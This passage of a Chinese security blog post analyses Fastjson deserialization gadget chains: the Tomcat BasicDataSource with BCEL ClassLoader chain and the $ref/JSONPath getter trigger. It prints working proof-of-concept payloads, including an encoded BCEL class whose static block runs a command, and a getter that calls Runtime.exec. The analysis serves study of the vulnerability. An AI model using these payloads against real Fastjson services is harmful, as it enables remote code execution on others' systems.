class="line">            dataSource = newDataSource;</span><br><span class="line">            <span class="keyword">return</span> dataSource;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里需要让</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dataSource;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> dataSource;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+<p>均为 false 才能调用</p>
+<p>接着</p>
+<p>在 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection()</code>  调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (Utils.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">            <span class="keyword">final</span> PrivilegedExceptionAction&lt;Connection&gt; action = <span class="keyword">new</span> <span class="title class_">PaGetConnection</span>();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> AccessController.doPrivileged(action);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> PrivilegedActionException e) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();</span><br><span class="line">                <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> SQLException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (SQLException) cause;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> createDataSource().getConnection();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>至此，链子的整体流程</p>
+<p><img src="https://img-blog.csdnimg.cn/1693c5418e4c430388cea181a4df746a.png" alt="在这里插入图片描述"></p>
+<p>poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kilo、冰室/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/7</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 14:30</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;ki10\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;: \&quot;Moc\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要注意的是</p>
+<p>这里 poc 的嵌套</p>
+<p>最后 <code>JSON.parse</code>  触发 <code>key.toString()</code></p>
+<p><img src="https://img-blog.csdnimg.cn/fb74d9af426b42988769e263895e46bb.png" alt="在这里插入图片描述"></p>
+<p>整个 poc 都为 <code>JSONObject</code>  ， <code>value</code>  为 <code>Moc</code></p>
+<p>然后判断是否是 <code>JSON</code>  对象，再去识别 <code>key</code>  和 <code>value</code></p>
+<p><img src="https://img-blog.csdnimg.cn/195ff4481c6742f3a50e37cba995bd88.png" alt="在这里插入图片描述"></p>
+<p>调试过程中确实两次落在该断点</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key = (key == <span class="literal">null</span>) ? <span class="string">&quot;null&quot;</span> : key.toString();</span><br></pre></td></tr></table></figure>
+<p>而在执行 toString () 时会将当前类转为字符串形式，会提取类中所有的 Field，执行相应的 getter 、is 等方法。因此也会执行 getConnection 方法</p>
+<p>当然以上都是建立在 <code>parse()</code>  方法之上</p>
+<p>如果 poc 是 <code>parseObject()</code>  ，那就简单了，因为在处理过程中会调用所有的 setter 和 getter 方法。详细可以看 FastJson 反序列化基础</p>
+<p>exp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kilo、冰室/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/7</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 14:30</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;               \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/aa37b1f2217b4c569f4cc52e1c21fa59.png" alt="在这里插入图片描述"></p>
+<p>上面我们说了那么多，基本已经走完了流程，但还有个问题，这里的 <code>driverClassName</code>  后面的值是什么</p>
+<p>可能还要到 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>  去找答案</p>
+<p>这里我们说，我们是通过 <code>loadClass</code>  下重写的方法来执行的，其中有个 <code>defiClass</code>  显然是通过字节码来实现的。再回过头看 <code>createClass</code>  中的 <code>Utility.*decode*</code></p>
+<p>这里我们还原一下内容</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELDecode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> <span class="string">&quot;$l$8b$I$A$A$A$A$A$A$A...&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] decode = Utility.decode(encode,<span class="literal">true</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;DecodeClass.class&quot;</span>);</span><br><span class="line">        fileOutputStream.write(decode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>得到 <code>DecodeClass.class</code></p>
+<p>实际上就是静态方法里面执行弹计算器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.p1ay2win.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var1) &#123;</span><br><span class="line">            var1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-ref"><a class="markdownIt-Anchor" href="#0x04-ref">#</a> 0x04 $ref</h2>
+<p>fastjson≥1.2.36</p>
+<p>这里我们要讨论的问题就是上面 <code>JSON.parse()</code>  和 <code>JSON.parseObect()</code>  这两种不同方法调用的问题</p>
+<p>这里给出另一种解决方法</p>
+<p>JSONPath</p>
+<p><img src="https://img-blog.csdnimg.cn/de2930ecd2f74ab1830e069a9f498672.png" alt="在这里插入图片描述"></p>
+<p>添加依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span><span class="number">.36</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kilo、冰室/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 0:10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;org.example.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kilo、冰室/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 0:06</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/dc6850c866f6481dace57ebac550a4fb.png" alt="在这里插入图片描述"></p>
+<p>首先就是我们要弄清该 <code>payload</code>  ，就需要知道 <code>[&#123;\&quot;@type\&quot;:\&quot;org.example.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]</code>  ref 的作用</p>
+<p><img src="https://img-blog.csdnimg.cn/ab171b9139874091a82122c3fad6eb83.png" alt="在这里插入图片描述"></p>
+<p>打上断点来 debug 下</p>
+<p>首先是 <code>handleResovleTask</code></p>
+<p>这里是处理 <code>refvalue</code>  的地方</p>
+<p>首先判断是否是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>开头，然后获取对象，最后确定</mtext><mi>r</mi><mi>e</mi><mi>f</mi><mtext>：</mtext><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">开头，然后获取对象，最后确定ref：`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">头</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">象</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">确</span><span class="mord cjk_fallback">定</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord cjk_fallback">：</span><span class="mord">‘</span></span></span></span>[0].cmd`</p>
+<p><code>$[0]</code>  表示的是数组里的第一个元素，则 <code>$[0].cmd</code>  表示的是获取第一个元素的 cmd 属性的值。</p>
+<p><img src="https://img-blog.csdnimg.cn/fdb0c42566414e3591b78f1d191acdc8.png" alt="在这里插入图片描述"></p>
+<p>来看 <code>getObject()</code></p>
+<p><img src="https://img-blog.csdnimg.cn/751616c24c5f457da87a714592975f71.png" alt="在这里插入图片描述"></p>
+<p>获取数组，第 0 个位 <code>$</code>  ，第 1 个为 <code>$[0]</code>  并返回该对象</p>
+<p>下面是 <code>JSONPath.eval()</code></p>
+<p><img src="https://img-blog.csdnimg.cn/26884761543445938984c316e180dd68.png" alt="在这里插入图片描述"></p>
+<p>继续跟进 <code>compile()</code></p>
+<p><img src="https://img-blog.csdnimg.cn/898491946cbf4d85a6c4be251c380780.png" alt="在这里插入图片描述"></p>
+<p>这里路径不为空，不会抛出异常</p>
+<p><img src="https://img-blog.csdnimg.cn/e8dbe9b8ad8c4c1799c94e66cb9057d9.png" alt="在这里插入图片描述"></p>
+<p>接着跟进 <code>eval</code>  下的 <code>init()</code></p>
+<p><img src="https://img-blog.csdnimg.cn/664019ba77384d2b825bd7318ec416fa.png" alt="在这里插入图片描述"></p>
+<p>这里 segments 为空，继续往下走</p>
+<p><img src="https://img-blog.csdnimg.cn/18ab23cb8a31429ab519f60a356a591e.png" alt="在这里插入图片描述"></p>
+<p>在调用 <code>parser.explain()</code>  方法前 <code>segments</code>  为空</p>
+<p><img src="https://img-blog.csdnimg.cn/28d9f9f3afbf4d2a96dfc9db42d162dd.png" alt="在这里插入图片描述"></p>
+<p><code>Segement[]</code>  初始长度为 8，因为其接口一共有 8 个</p>
+<p><img src="https://img-blog.csdnimg.cn/e60e37f4682847d78af2d7a9ad4ac0c5.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/36139b0c68da4c61a6d3d5901ed056b8.png" alt="在这里插入图片描述"></p>
+<p>这里 <code>segment</code>  值就变成了 <code>JSONPath</code></p>
+<p><img src="https://img-blog.csdnimg.cn/78b0c4eb78764b249e060612f04373dc.png" alt="在这里插入图片描述"></p>
+<p>循环追加到 <code>StringBuilder</code>  后面</p>
+<p><img src="https://img-blog.csdnimg.cn/7f08963a6fb2456db9098255b6b28de4.png" alt="在这里插入图片描述"></p>
+<p>然后按顺序执行前面 <code>explain</code>  () 生成的 <code>Segment array</code></p>
+<p>最终在 <code>getPropertyValue()</code>  反射调用 <code>get()</code></p>
+<p>至此，就完成了不使用 <code>JSON.parseObect()</code>  也能调用 <code>get()</code>  的方法</p>
+<p>最后可以看下 Y4 师傅的</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/120275526?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166824314316782425171350%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166824314316782425171350&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-120275526-null-null.nonecase&amp;utm_term=ref&amp;spm=1018.2226.3001.4450">[Java 安全] Fastjson＞=1.2.36$ref 引用可触发 get 方法分析_Y4tacker 的博客 - CSDN 博客_fastjson get 方法</a></p>
+<h2 id="0x05-参考"><a class="markdownIt-Anchor" href="#0x05-参考">#</a> 0x05 参考</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/120275526?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166824314316782425171350%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166824314316782425171350&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-120275526-null-null.nonecase&amp;utm_term=ref&amp;spm=1018.2226.3001.4450">[Java 安全] Fastjson＞=1.2.36$ref 引用可触发 get 方法分析_Y4tacker 的博客 - CSDN 博客_fastjson get 方法</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/R0ser1/p/15918626.html#%E4%BB%80%E4%B9%88%E6%98%AFref">fastjson 不出网学习 - R0ser1 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://ccship.cn/2021/12/21/fastjson%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bbasicdatasource%e5%88%a9%e7%94%a8%e9%93%be/">FastJson 反序列化之 BasicDataSource 利用链 – cc (ccship.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.play2win.top/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/">fastjson 不出网利用简析 - P1ay2win’s blog (play2win.top)</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/09/26/%E4%BF%A1%E5%AE%89%E5%AE%9E%E9%AA%8C-DES(%E5%A4%87%E8%AF%BE)/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-11-14 01:28:36
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <b>#</b> 代码审计
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                        <b>#</b> Java安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/FastJson/" title="FastJson">
+                        <b>#</b> FastJson
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
